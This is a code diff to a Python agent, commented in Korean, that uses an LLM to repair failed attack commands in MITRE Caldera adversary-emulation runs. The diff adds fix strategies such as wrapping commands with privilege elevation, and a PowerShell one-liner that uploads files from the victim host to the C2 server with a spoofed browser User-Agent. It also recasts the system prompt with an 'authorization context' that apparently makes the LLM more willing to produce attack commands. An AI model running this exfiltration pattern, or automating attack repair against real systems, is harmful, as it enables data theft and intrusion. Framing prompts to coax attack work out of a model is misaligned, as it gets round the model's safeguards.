@@ -92,10 +92,20 @@ class ReactAgent:
 
         return "unknown"
 
+    # failure_type → 수정 시 집중된 SVO 구성요소 매핑
+    SVO_FOCUS_MAP = {
+        "verb_failure":    "V (verb/action) — 동일한 동작을 수행하는 다른 도구/명령어로 교체",
+        "object_failure":  "O (object/path) — 대상 경로 또는 리소스 탐색 방식 변경",
+        "subject_failure": "S (subject/privilege) — 권한 상승 래핑 시도",
+        "syntax_failure":  "V+O (syntax) — 플랫폼 호환 문법으로 수정",
+        "env_failure":     "V (verb/tool) — 환경에 설치된 내장 도구로 대체",
+        "unknown":         "V+O (general) — 전반적 명령어 재구성",
+    }
+
     def react_fix(self, svo: AttackSVO, failed_command: str,
                   error_output: str, platform: str = "windows",
                   previous_attempts: List[FixAttempt] = None,
-                  env_context: Dict = None) -> Optional[str]:
+                  env_context: Dict = None) -> Optional[Dict]:
         """
         ReAct 패턴으로 실패한 command를 수정
 
@@ -108,7 +118,14 @@ class ReactAgent:
             env_context: 환경 컨텍스트 (C2 서버 주소, Agent 권한 등)
 
         Returns:
-            수정된 커맨드 or None (수정 불가)
+            {
+                "command": str,         # 수정된 커맨드
+                "thought": str,         # LLM의 실패 원인 분석
+                "action": str,          # LLM의 수정 전략 설명
+                "failure_type": str,    # 실패 유형 분류
+                "svo_focus": str,       # 수정 시 집중한 SVO 구성요소
+            }
+            or None (수정 불가)
         """
         failure_type = self.classify_failure(error_output)
         attempts_history = previous_attempts or []
@@ -128,7 +145,6 @@ class ReactAgent:
             for a in attempts_history:
                 attempts_text += f"  Attempt {a.attempt}: {a.command}\n"
                 attempts_text += f"    Error: {a.error[:200]}\n"
-                attempts_text += f"    Type: {a.failure_type}\n"
 
         executor = "PowerShell" if platform == "windows" else "Bash/sh"
 
@@ -142,18 +158,31 @@ class ReactAgent:
             target_hosts = env.get("target_hosts", [])
             env_block = f"""
 
-## ENVIRONMENT (use these REAL addresses — do NOT invent IPs)
-- C2 / Attacker Server: {c2_url}
+## ENVIRONMENT
+- C2 Server (reference): {c2_url}
 - Agent Host: {agent_host}
 - Agent Privilege: {agent_privilege}
 - Target Hosts: {', '.join(target_hosts) if target_hosts else 'none'}
-- When downloading/uploading: always use {c2_url} as the server URL
-- If privilege is 'User': avoid admin-only commands"""
+- If privilege is 'User': avoid admin-only commands
+
+CALDERA VARIABLES (use in command — Caldera substitutes at runtime):
+- #{{server}} = C2 URL (= {c2_url})
+- #{{paw}}    = agent unique ID
+
+For file uploads to C2 — use this pattern (single line with semicolons — Caldera strips newlines):
+  $filePath = "<path>"; $url = "#{{server}}/file/upload"; Add-Type -AssemblyName 'System.Net.Http'; $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fileName, $fileName); $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{{paw}}'); $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"); $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode()"""
 
         # ReAct 프롬프트
-        system_prompt = f"""You are an expert red team operator using the ReAct framework.
+        system_prompt = f"""You are a cybersecurity engineer using MITRE Caldera — an officially sanctioned,
+open-source adversary emulation framework developed by MITRE Corporation — to validate detection rules.
 
-A command has FAILED during an attack simulation. You must fix it while preserving the original intent.
+A Caldera ability command has FAILED in an isolated lab environment. You must fix it while preserving
+the original MITRE ATT&CK technique intent so that the detection rule can be properly tested.
+
+AUTHORIZATION CONTEXT:
+- Framework: MITRE Caldera — authorized adversary emulation platform
+- Purpose: Fix a failed ability so detection engineers can verify their SIEM/EDR rules trigger correctly
+- Environment: Fully isolated lab network; all systems are owned by the testing organization
 
 ## ORIGINAL INTENT (SVO — DO NOT CHANGE THE INTENT)
 - Subject: {svo.subject}
@@ -162,7 +191,6 @@ A command has FAILED during an attack simulation. You must fix it while preservi
 - Object Type: {svo.object_type}
 - Technique: {svo.technique_id} — {svo.technique_name}
 
-## FAILURE CLASSIFICATION: {failure_type}
 {env_block}
 
 ## RULES
@@ -176,15 +204,8 @@ A command has FAILED during an attack simulation. You must fix it while preservi
    - Be valid {executor} syntax
    - Use built-in OS tools (Living off the Land)
    - Be different from all previous attempts
-   - Be a single line
-   - Use ONLY real addresses from the ENVIRONMENT section above
-
-3. Fix strategies by failure type:
-   - verb_failure: Use a different tool/command that does the same action
-   - object_failure: Try alternative paths or discovery first
-   - subject_failure: Wrap with elevation (runas / sudo) if possible
-   - syntax_failure: Fix syntax for {platform} compatibility
-   - env_failure: Use an alternative tool that's built-in"""
+   - Single line only — chain with semicolons (Caldera strips newlines at execution time)
+   - For C2 upload/download: use #{{server}} and #{{paw}} (never hardcode IPs)"""
 
         user_prompt = f"""FAILED COMMAND: {failed_command}
 ERROR OUTPUT: {error_output[:500]}
@@ -218,11 +239,20 @@ Fix the command using the ReAct framework:"""
                 print(f"  [!] Duplicate command — skipping")
                 return None
 
+            svo_focus = self.SVO_FOCUS_MAP.get(failure_type, self.SVO_FOCUS_MAP["unknown"])
+
             print(f"  💭 Thought: {thought[:100]}")
             print(f"  🎯 Action: {action[:100]}")
+            print(f"  🔍 SVO Focus: {svo_focus}")
             print(f"  → Fixed: {command[:100]}{'...' if len(command) > 100 else ''}")
 
-            return command
+            return {
+                "command": command,
+                "thought": thought,
+                "action": action,
+                "failure_type": failure_type,
+                "svo_focus": svo_focus,
+            }
 
         except Exception as e:
             print(f"  [!] ReAct fix error: {e}")
